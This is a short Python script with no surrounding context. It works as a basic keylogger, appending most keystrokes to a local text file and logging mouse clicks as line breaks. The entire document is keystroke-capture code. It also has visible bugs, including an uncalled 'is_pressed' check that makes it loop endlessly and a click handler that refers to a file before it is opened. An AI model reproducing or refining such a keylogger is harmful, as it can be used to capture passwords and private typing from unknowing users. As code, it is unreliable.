import keyboard, mouse
mouse.on_click(lambda: f.write("\n"), args=())
while (True):
    f = open("keyyed.txt", "a")
    if((a:=keyboard.read_key())!="" and a!="right" and a!="right shift" and a!="left" and a!="up" and a!="down" and a!="shift" and a!="tab" and a!="caps lock"):
        f.write(a)
        while(keyboard.is_pressed):
            print(".")
    f.close()